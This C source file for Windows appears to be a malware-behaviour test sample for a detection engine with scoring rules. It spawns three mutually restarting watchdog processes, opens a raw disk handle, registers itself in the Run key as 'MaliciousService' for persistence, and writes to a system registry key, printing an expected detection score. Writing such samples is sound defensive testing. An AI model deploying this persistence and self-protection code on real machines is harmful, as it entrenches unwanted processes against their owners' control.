#include <windows.h>
#include <stdio.h>
#include <string.h>

#define WATCHDOG_COUNT 3

HANDLE watchdogHandles[WATCHDOG_COUNT] = {0};
DWORD watchdogPids[WATCHDOG_COUNT] = {0};
int watchdogCount = 0;
CRITICAL_SECTION cs;

BOOL IsProcessRunning(DWORD pid) {
    HANDLE h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (h) {
        DWORD exitCode;
        GetExitCodeProcess(h, &exitCode);
        CloseHandle(h);
        return exitCode == STILL_ACTIVE;
    }
    return FALSE;
}

DWORD WINAPI WatchdogThread(LPVOID param) {
    int index = *(int*)param;
    DWORD myPid = GetCurrentProcessId();
    printf("Watchdog %d thread running (PID: %lu)\n", index, myPid);
    
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    
    while (1) {
        for (int i = 0; i < WATCHDOG_COUNT; i++) {
            if (i == index) continue;
            
            EnterCriticalSection(&cs);
            DWORD targetPid = watchdogPids[i];
            LeaveCriticalSection(&cs);
            
            if (targetPid != 0 && !IsProcessRunning(targetPid)) {
                printf("Watchdog %d: Process %lu is dead, restarting...\n", index, targetPid);
                
                STARTUPINFOA si = {0};
                si.cb = sizeof(si);
                PROCESS_INFORMATION pi = {0};
                
                char cmdline[MAX_PATH * 2];
                snprintf(cmdline, sizeof(cmdline), "\"%s\" --watchdog %d", path, i);
                
                if (CreateProcessA(NULL, cmdline, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
                    printf("Watchdog %d: Restarted process, new PID: %lu\n", index, pi.dwProcessId);
                    EnterCriticalSection(&cs);
                    watchdogPids[i] = pi.dwProcessId;
                    LeaveCriticalSection(&cs);
                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                } else {
                    printf("Watchdog %d: Failed to restart process, error=%lu\n", index, GetLastError());
                }
            }
        }
        Sleep(500);
    }
    return 0;
}

BOOL WriteToRunKey() {
    HKEY hKey;
    LONG result = RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                                0, KEY_WRITE, &hKey);
    if (result != ERROR_SUCCESS) {
        printf("[MALICIOUS] Failed to open HKCU\\Run, trying HKLM...\n");
        result = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                              0, KEY_WRITE, &hKey);
        if (result != ERROR_SUCCESS) {
            printf("[MALICIOUS] Failed to open HKLM\\Run\n");
            return FALSE;
        }
    }
    
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    
    result = RegSetValueExA(hKey, "MaliciousService", 0, REG_SZ, (BYTE*)path, strlen(path) + 1);
    RegCloseKey(hKey);
    
    if (result == ERROR_SUCCESS) {
        printf("[MALICIOUS] SUCCESS: Written to Run key\n");
        return TRUE;
    }
    printf("[MALICIOUS] Failed to write to Run key\n");
    return FALSE;
}

BOOL WriteToSystemRegistry() {
    HKEY hKey;
    LONG result = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows NT\\CurrentVersion", 
                                0, KEY_WRITE, &hKey);
    if (result != ERROR_SUCCESS) {
        printf("[MALICIOUS] Failed to open SYSTEM registry\n");
        return FALSE;
    }
    
    result = RegSetValueExA(hKey, "TestMaliciousEntry", 0, REG_SZ, 
                           (BYTE*)"malicious_value", strlen("malicious_value") + 1);
    RegCloseKey(hKey);
    
    if (result == ERROR_SUCCESS) {
        printf("[MALICIOUS] SUCCESS: Written to SYSTEM registry\n");
        return TRUE;
    }
    printf("[MALICIOUS] Failed to write to SYSTEM registry\n");
    return FALSE;
}

int RunAsWatchdog(int index) {
    printf("=== Running as Watchdog %d ===\n", index);
    printf("PID: %lu\n", GetCurrentProcessId());
    
    InitializeCriticalSection(&cs);
    watchdogPids[index] = GetCurrentProcessId();
    
    for (int i = 0; i < WATCHDOG_COUNT; i++) {
        if (i != index) {
            watchdogPids[i] = 0;
        }
    }
    
    HANDLE hThread = CreateThread(NULL, 0, WatchdogThread, &index, 0, NULL);
    if (hThread) {
        printf("Watchdog %d: Started monitoring thread\n", index);
    }
    
    printf("Watchdog %d: Sleeping and protecting...\n", index);
    while (1) {
        Sleep(1000);
    }
    
    DeleteCriticalSection(&cs);
    return 0;
}

int main(int argc, char* argv[]) {
    if (argc >= 3 && strcmp(argv[1], "--watchdog") == 0) {
        int index = atoi(argv[2]);
        if (index >= 0 && index < WATCHDOG_COUNT) {
            return RunAsWatchdog(index);
        }
    }
    
    printf("=== Watchdog Protection Test - Main Process ===\n");
    printf("PID: %lu\n", GetCurrentProcessId());
    
    InitializeCriticalSection(&cs);
    
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    
    printf("\nCreating %d watchdog processes...\n", WATCHDOG_COUNT);
    for (int i = 0; i < WATCHDOG_COUNT; i++) {
        STARTUPINFOA si = {0};
        si.cb = sizeof(si);
        PROCESS_INFORMATION pi = {0};
        
        char cmdline[MAX_PATH * 2];
        snprintf(cmdline, sizeof(cmdline), "\"%s\" --watchdog %d", path, i);
        
        if (CreateProcessA(NULL, cmdline, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
            printf("Created watchdog %d with PID: %lu\n", i, pi.dwProcessId);
            watchdogPids[i] = pi.dwProcessId;
            watchdogHandles[i] = pi.hProcess;
            watchdogCount++;
            CloseHandle(pi.hThread);
        } else {
            printf("Failed to create watchdog %d, error=%lu\n", i, GetLastError());
        }
    }
    
    Sleep(2000);
    
    printf("\n=== Performing malicious actions ===\n");
    
    printf("Step 1: Opening PhysicalDrive0...\n");
    HANDLE hDisk = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, 
                          NULL, OPEN_EXISTING, 0, NULL);
    if (hDisk == INVALID_HANDLE_VALUE) {
        printf("PhysicalDrive0 failed, trying \\\\.\\C: ...\n");
        hDisk = CreateFileA("\\\\.\\C:", GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, 
                          NULL, OPEN_EXISTING, 0, NULL);
    }
    
    if (hDisk != INVALID_HANDLE_VALUE) {
        printf("SUCCESS: Disk handle opened!\n");
    } else {
        printf("FAILED: Could not open disk handle, error=%lu\n", GetLastError());
    }
    
    Sleep(3000);
    
    printf("\nStep 2: Writing to Run key...\n");
    WriteToRunKey();
    
    Sleep(1000);
    
    printf("\nStep 3: Writing to SYSTEM registry...\n");
    WriteToSystemRegistry();
    
    printf("\n=== Malicious actions complete ===\n");
    printf("Expected score: R001(35) + R007a(35) + R006(10) = 80 points\n");
    printf("Waiting for termination...\n");
    
    if (hDisk != INVALID_HANDLE_VALUE) {
        Sleep(30000);
        CloseHandle(hDisk);
    } else {
        Sleep(30000);
    }
    
    for (int i = 0; i < watchdogCount; i++) {
        if (watchdogHandles[i]) {
            CloseHandle(watchdogHandles[i]);
        }
    }
    DeleteCriticalSection(&cs);
    
    return 0;
}